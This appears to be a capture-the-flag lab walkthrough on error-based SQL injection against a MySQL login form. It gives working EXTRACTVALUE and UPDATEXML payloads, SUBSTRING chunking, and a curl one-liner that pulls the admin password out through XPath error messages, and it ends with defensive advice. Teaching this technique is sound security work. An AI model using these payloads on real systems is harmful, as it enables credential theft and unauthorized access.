<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the Username field (leave Password empty or anything).
    If you see a MySQL syntax error, the input is being injected directly into the query.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near <strong>'x'' at line 1</strong>
    </div>
</div>

<p>
    You should see an error like: <code>You have an error in your SQL syntax...</code>.
    This confirms the input is vulnerable.
</p>

<h4>Step 2: Understand the Challenge</h4>
<p>
    This page only shows <strong>&ldquo;Login successful&rdquo;</strong> or
    <strong>&ldquo;Invalid credentials&rdquo;</strong>: no column data is ever
    displayed in the page. You cannot use UNION-based injection because there is no
    output channel for row data. However, <strong>MySQL errors are displayed</strong>,
    which gives us an error-based extraction channel.
</p>

<h4>Step 3: Confirm Error-Based Extraction with EXTRACTVALUE</h4>
<p>
    <code>EXTRACTVALUE(xml_frag, xpath_expr)</code> evaluates an XPath expression against
    an XML fragment. If the XPath is invalid, MySQL throws an error that includes the
    invalid XPath string. By using <code>CONCAT(0x7e, ...)</code> we create an XPath
    starting with <code>~</code> which is always invalid.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Test EXTRACTVALUE with version()</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span>XPATH syntax error: '~11.8.6-MariaDB-2 from Debian'
    </div>
</div>

<p>
    The error message will contain something like:
    <code>XPATH syntax error: '~11.8.6-MariaDB-2 from Debian'</code>.
    This confirms that error-based extraction works.
</p>

<h4>Step 4: Extract the Admin Password via EXTRACTVALUE</h4>
<p>
    Now target the admin password directly:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span>XPATH syntax error: '~FLAG{3xtr4ctv4lu3_x0rth_3rr0r}'
    </div>
</div>

<p>
    The error message will show: <code>XPATH syntax error: '~FLAG{3xtr4ctv4lu3_x0rth_3rr0r}'</code>.
    The flag is the part after the <code>~</code> tilde.
</p>

<h4>Step 5: Handling Long Values (SUBSTRING)</h4>
<p>
    EXTRACTVALUE has a <strong>32-character limit</strong> on the error output. If the
    target value is longer than 32 characters, you need to extract it in chunks:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. SUBSTRING for Long Values</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">First 32 chars: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 32))) -- -<br>
        <span class="prompt">Next 32 chars: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users WHERE username='admin'), 33, 32))) -- -
    </div>
</div>

<h4>Step 6: Alternative. UPDATEXML</h4>
<p>
    <code>UPDATEXML(xml_target, xpath_expr, new_value)</code> works the same way.
    If the XPath expression is invalid, the error leaks the value:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. UPDATEXML Alternative</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')), 1) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span>XPATH syntax error: '~FLAG{3xtr4ctv4lu3_x0rth_3rr0r}'
    </div>
</div>

<p>
    This also produces: <code>XPATH syntax error: '~FLAG{3xtr4ctv4lu3_x0rth_3rr0r}'</code>.
</p>

<h4>Step 7: Submit the Password</h4>
<p>
    Copy the flag from the error message (without the <code>~</code> prefix) and paste
    it into the verification form: <code>FLAG{3xtr4ctv4lu3_x0rth_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab5" \<br> --data-urlencode "username=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- -" \<br> --data-urlencode "password=anything"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Even when no query data is displayed on the page,
    MySQL error messages can become a data extraction channel. EXTRACTVALUE() and
    UPDATEXML() abuse invalid XPath expressions to leak arbitrary data through
    error strings. Always use prepared statements and <strong>never expose raw
    error messages</strong> in production.
</div>
